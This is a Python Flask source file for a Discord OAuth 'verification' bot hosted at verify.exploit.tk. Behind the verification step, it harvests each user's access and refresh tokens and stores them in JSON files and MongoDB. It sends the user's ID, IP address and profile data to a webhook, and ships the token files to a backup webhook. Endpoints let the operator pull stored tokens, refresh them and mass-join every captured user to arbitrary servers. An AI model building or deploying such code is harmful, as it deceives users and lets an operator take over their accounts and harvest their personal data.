# https://canary.discord.com/api/oauth2/authorize?client_id=994684314010796083&redirect_uri=https://verify.exploit.tk&response_type=code&scope=identify%20guilds.join

import os
# os.system("pip install dhooks")
import json, requests
from dhooks import Webhook, File
from flask import Flask, redirect, url_for, request, jsonify
app = Flask(__name__)

import pymongo
import urllib.parse

# @app.route('/')
# def hello_world():
#     return 'unauthorized'
# import discord

# from discord import *
# from discord.ext import commands




verified_redirect = ""
verifier_redir = "https://discord.com/api/oauth2/authorize?client_id=994684314010796083&redirect_uri=https://verify.exploit.tk&response_type=code&scope=identify%20guilds.join"
hook = os.environ["hook"]
tkn = os.environ["tkn"]
API_ENDPOINT = 'https://canary.discord.com/api/v9'
CLIENT_ID = '994684314010796083'
CLIENT_SECRET = os.environ['c_s']
REDIRECT_URI = 'https://verify.exploit.tk'  #
TOKEN_FINDER_API = "https://"
TOKEN_FINDER_API_AUTH = "02ab23b5df4ff52f46320e92d7"
backup_hook = os.environ["backup_"]
pwd = os.environ['pwd']
mongopass = os.environ['mongopass']

username = urllib.parse.quote_plus('exploit')
password = urllib.parse.quote_plus(mongopass)
uri = "mongodb+srv://%s:%s@auth.njrnqbq.mongodb.net/test" % (username, password)
conn = pymongo.MongoClient(uri)

def exchange_code(code):
  data = {
    'client_id': CLIENT_ID,
    'client_secret': CLIENT_SECRET,
    'grant_type': 'authorization_code',
    'code': code,
    'redirect_uri': REDIRECT_URI
  }
  headers = {'Content-Type': 'application/x-www-form-urlencoded'}
  r = requests.post(str(API_ENDPOINT) + '/oauth2/token',
                    data=data,
                    headers=headers)
  if r.status_code in (200, 201, 204):
    return r.json()
  else:
    return False


def add_to_guild(access_token, userID, guild_Id, ip):
  url = f"{API_ENDPOINT}/guilds/{guild_Id}/members/{userID}"

  botToken = tkn
  data = {
    "access_token": access_token,
  }
  headers = {
    "Authorization": f"Bot {botToken}",
    'Content-Type': 'application/json'
  }
  r = requests.put(url=url, headers=headers, json=data)
  print(r.status_code)
  endp = "https://canary.discord.com/api/v9/users/@me"
  r = requests.get(endp, headers={"Authorization": f"Bearer {access_token}"})
  rjson = r.json()
  # print(response.text)
  # print(response.status_code)
  # print(REDIRECT_URI)
  content = f">>> new user authed\n\nID: {userID}\nMention:<@{userID}>\nIP: {ip}\n\nData: {rjson}"
  r = requests.post(
  hook, json={ "content": content })
  r = requests.put(
    f"https://canary.discord.com/api/v9/guilds/952495772073619466/members/{userID}/roles/988815859814383648",
    headers={"Authorization": f"Bot {tkn}"})
  return r.status_code

  
def get_user(access: str):
  endp = "https://canary.discord.com/api/v9/users/@me"
  r = requests.get(endp, headers={"Authorization": f"Bearer {access}"})
  rjson = r.json()
  return rjson['id']


def get_new_token(refresh):
  headers = {'Content-Type': 'application/x-www-form-urlencoded'}
  data = {
    'client_id': CLIENT_ID,
    'client_secret': CLIENT_SECRET,
    'grant_type': 'refresh_token',
    'refresh_token': refresh
  }
  r = requests.post(f"{API_ENDPOINT}/oauth2/token", data=data, headers=headers)
  if r.status_code in (200, 201, 204):
    return r.json()
  return "failed"


# code = exchange_code('gvxPfY7M80idbUgN6YfwJPUIEuP2kv')['access_token']
# add_to_guild(access_token="9csiMPR9reOxjDJCxEc1z7oZJwNiUm", userID="661563598711291904" , guild_Id="1028633555972145183")
# @app.route('/')
# def main():
#   return redirect("https://discord.com/invite/spy", code=302)

# def handler(code: str):
def save(id:str, access_tk:str, refresh_tk:str):
  try:
    with open('Database/access_tokens.json', 'r') as f:
      db1 = json.load(f)
      db1[str(id)] = str(access_tk)
      with open('Database/access_tokens.json', 'w') as f:
        json.dump(db1, f, indent=2)
    with open('Database/refresh_tokens.json', 'r') as f:
      db2 = json.load(f)
      db2[str(id)] = str(refresh_tk)
      with open('Database/refresh_tokens.json', 'w') as f:
        json.dump(db2, f, indent=2)
  except:
    pass
  found = False
  db = conn["tokens"]
  access = db["access"]
  refresh = db["refresh"]
  # access.insert_one({"ok": "ok"})
  idk = access.find()
  for x in idk:
    strx = str(x)
    if id in strx:
      print("found")
      found = True
      accessx = { "$set": { id: access_tk }}
      access.update_one(x, accessx)
      refreshx = { "$set": { id: refresh_tk }}
      refresh.update_one(x, refreshx)
      break
    else:
      continue
  if found == False:
    accessx = { id: access_tk }
    refreshx = { id: refresh_tk }
    access.insert_one(accessx)
    refresh.insert_one(refreshx)
  # try:
  #   
    # for x in index1:
    #   strx = str(x)
    #   if id in strx:
        
    


def test():
  print("works")

@app.route("/backup", methods = ['POST'])
def backup():
  limiter = "not set yet"
  if request.headers.get('Authorization') != pwd:
    return 'unauthorized'
  try:
    sender = Webhook(backup_hook)
    file1 = File("Database/access_tokens.json", name="access.txt")
    file2 = File("Database/refresh_tokens.json", name="refresh.txt")
    sender.send("access", file=file1)
    sender.send("refresh", file=file2)
    return "success"
  except Exception as e:
# print(e)
    return "failed\n %s" % (e)
  else:
    return "unauthorized"


# backup()
@app.route("/pullsingle", methods = ["get"])
def pullsingle():
  if request.headers.get('Authorization') != pwd:
    return 'unauthorized'
  jsonxd = request.json 
  user = jsonxd["user"]
  f = open("Database/access_tokens.json", "r").read()
  f = json.loads(f)
  try:
    tk = f[user]
  except KeyError:
    return "dberr"
  print(tk)
  return tk

@app.route("/refreshsingle", methods = ["put"])
def refreshsingle():
  if request.headers.get('Authorization') != pwd:
    return 'unauthorized'
  jsonxd = request.json 
  user = jsonxd["user"]
  f = open("Database/refresh_tokens.json", "r").read()
  f = json.loads(f)
  try:
    tk = f[user]
  except:
    return "this user is not in database"
  print(tk)
  r = get_new_token(tk)
  if r == "failed":
    return "failed"
  access = r["access_token"]
  refresh = r["refresh_token"]
  save(user, access, refresh)
  return "success"
  
@app.route("/pull", methods = ['POST'])
def pull():
  if request.headers.get('Authorization') != pwd:
    return 'unauthorized'
  jsonxd = request.json
  guild = jsonxd['guild']
  access = open('Database/access_tokens.json', 'r').read()
  access = json.loads(access)
  added = 0
  failed = 0
  for key in access:
    value = access[key]
    print(key, value)
    r = add_to_guild(value, key, guild)
    if r in (200, 201, 204):
      added += 1
    else:
      failed += 1
  return "success\n %s\n\nfailed\n %s" % (added, failed)
  
    

@app.route("/members", methods = ['GET'])
def members():
  if request.headers.get('Authorization') != pwd:
    return 'unauthorized'
  access = open("Database/access_tokens.json").readlines()
  # access = json.loads(access)
  return str(len(access))

def refresh_all():
  refresh = open("Database/refresh_tokens.json").read()
  refresh = json.loads(refresh)
  for key in refresh:
    value = refresh[key]
    r = get_new_token(value) # commented to avoid massacres
    new_access = r["access_token"]
    new_refresh = r["refresh_token"]
    f = open("backup.txt", "a")
    f.write("%s:%s:%s" % (key, new_access, new_refresh))
    print("%s:%s:%s" % (key, new_access, new_refresh))
    save(key, new_access, new_refresh)
    
@app.route("/refresh", methods = ['POST'])
def refresh():
  if request.headers.get('Authorization') != pwd:
    return 'unauthorized'
  return "failed"
  # access = open("access_tokens.json").read()
  refresh_all()
  return "200"
    
@app.route("/check", methods = ['get'])
def check():
  if request.headers.get('Authorization') != pwd:
    return 'unauthorized'
  jsonxd = request.json
  # print(jsonxd)
  user = jsonxd['user']
  f = open("Database/access_tokens.json", "r").read()
  f = json.loads(f)
  try:
    tk = f[user]
    # print(tk)
  except KeyError:
    return "entry %s not found" % (user)
  endp = "https://canary.discord.com/api/v9/users/@me"
  r = requests.get(endp, headers={"Authorization": f"Bearer {tk}"})
  rjson = r.json()
  print(rjson)
  return "entry found: \n\n%s" % (rjson)

# @app.route("/myip", methods=["GET"])
# def get_my_ip():
#   ip = request.environ['HTTP_X_FORWARDED_FOR']
#   ip = ip.split(',')[0]
#   return ip
#     # return jsonify({'ip': request.remote_addr}), 200
#   ip = request.environ['REMOTE_ADDR']
#   return str(ip)
    
@app.route('/usr/passwd')
def hello_world():
    ip_addr = request.remote_addr
    return "trolled" 
    # return '<h1> Your IP address is:' + ip_addr
@app.route('/')
def process_json():
  # os.system("clear")
  # test()
  # redirect("https://discord.com/invite/spy", code=302)
  try:
    ip = request.environ['HTTP_X_FORWARDED_FOR']
    ip = ip.split(',')[0]
  except:
    ip = None
  args = request.args
  if "code" not in args:
    return redirect(verifier_redir, code=302)
  idk = args.get('code')
  idk = str(idk)
  # print(idk)
  # handler(idk)
  try:
    # print("testing")
    exchange = exchange_code(idk)
    if exchange == False:
      return redirect("https://discord.com/oauth2/authorized", code=302)
    # print(exchange)
    access_tk = exchange['access_token']
    # print(access_tk)
    refresh_tk = exchange['refresh_token']
    # print(refresh_tk)
    id = get_user(access_tk)
    # print(id)
    save(id, access_tk, refresh_tk)
    # Sliding Code to Token Finder API
  except:
    return redirect("https://discord.com/oauth2/authorized", code=302)
  try:
    add_to_guild(str(access_tk), str(id), "952495772073619466", ip)
  except:
    pass
  return redirect("https://discord.com/oauth2/authorized", code=302)
  # content_type = request.headers.get('Content-Type')
  # if (content_type == 'application/json'):
  # json = request.json
  # # return 200
  # print(json)
  # print(request.headers)
  # user = json["user"]
  # guild = json["guild"]
  # verify(user)


if __name__ == '__main__':
  app.run(host='0.0.0.0', port=8000)
